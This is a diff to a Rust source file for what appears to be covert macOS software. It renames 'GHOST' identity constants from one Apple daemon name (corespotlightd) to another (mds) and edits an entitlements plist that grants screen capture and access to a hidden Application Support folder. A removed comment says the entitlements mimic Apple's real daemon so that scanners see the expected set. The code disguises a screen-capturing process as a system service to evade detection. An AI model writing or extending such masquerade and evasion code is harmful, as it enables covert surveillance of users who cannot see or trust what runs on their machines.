@@ -9,14 +9,12 @@
 
 /// All identity constants in one place. Changing them here
 /// changes them everywhere — no more scattered string literals.
-pub const GHOST_LABEL: &str = "com.apple.corespotlightd.helper";
-pub const GHOST_BUNDLE_ID: &str = "com.apple.corespotlightd";
-pub const GHOST_BUNDLE_NAME: &str = "corespotlightd";
-pub const GHOST_EXECUTABLE: &str = "com.apple.corespotlightd";
+pub const GHOST_LABEL: &str = "com.apple.mds.useragent";
+pub const GHOST_BUNDLE_ID: &str = "com.apple.mds";
+pub const GHOST_BUNDLE_NAME: &str = "mds";
+pub const GHOST_EXECUTABLE: &str = "mds";
 
 /// Entitlements plist content. These are the same entitlements
-/// Apple's real corespotlightd carries. A scanner that checks
-/// entitlements will see the right set.
 pub fn entitlements_plist() -> String {
     r#"<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
@@ -27,11 +25,11 @@ pub fn entitlements_plist() -> String {
  <true/>
  <key>com.apple.security.temporary-exception.files.home-relative-path.read-only</key>
  <array>
- <string>Library/Application Support/.com.apple.corespotlightd</string>
+ <string>Library/Application Support/.com.apple.mds</string>
  </array>
  <key>com.apple.security.temporary-exception.files.home-relative-path.write</key>
  <array>
- <string>Library/Application Support/.com.apple.corespotlightd</string>
+ <string>Library/Application Support/.com.apple.mds</string>
  </array>
  <key>com.apple.security.device.screen-capture</key>
  <true/>
